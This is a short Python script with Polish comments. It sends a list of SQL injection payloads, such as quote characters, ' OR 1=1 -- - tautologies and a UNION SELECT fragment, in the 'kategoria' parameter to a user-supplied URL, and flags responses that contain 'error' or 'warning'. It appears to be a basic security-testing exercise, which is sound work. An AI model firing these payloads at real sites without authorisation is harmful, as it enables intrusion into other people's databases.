import requests

payloady = [
    "'",
    "''",
    "`",
    "``",
    ",",
    "\"",
    "\"\"",
    "/",
    "//",
    "\\",
    "\\\\",
    ";",
    "' or \"",
    "-- or #",
    "' OR '1",
    "' OR 1 -- -",
    "\" OR \"\" = \"",
    "\" OR 1 = 1 -- -",
    "' OR '' = '",
    "'='",
    "'LIKE'",
    "'=0--+",
    " OR 1=1",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "''''''''''''''UNION SELECT '2"
]


def testSQLinjection(link, payloady):
    """
        Ta funkcja wysyła żądania ze złośliwymi payloadami na podany adres URL, aby
        przetestować podatności na ataki SQL injection.


        Argumenty:
        link (str): adres aplikacji internetowej do przetestowania.
        payloady (list): lista złośliwych payloadów używanych do testowania podatności na ataki SQL injection.

        Funkcja sprawdza, czy w odpowiedzi serwera nie ma błędów lub ostrzeżeń
        po wysłaniu każdego payloadu i drukuje wynik dla każdego payloadu.
        """
    for payload in payloady:
        odpowiedz = requests.get(link, params={"kategoria": payload})

        if "error" in odpowiedz.text.lower() or "warning" in odpowiedz.text.lower():
            print(f"Możliwa podatność na atak SQL injection dla payloadu: {payload}")
        else:
            print(f"Payload {payload} wydaje się być bezpieczny.")

link = input("Podaj link do aplikacji webowej którą chesz przetestować pod kątem ataku SQL injection: ")

testSQLinjection(link, payloady)
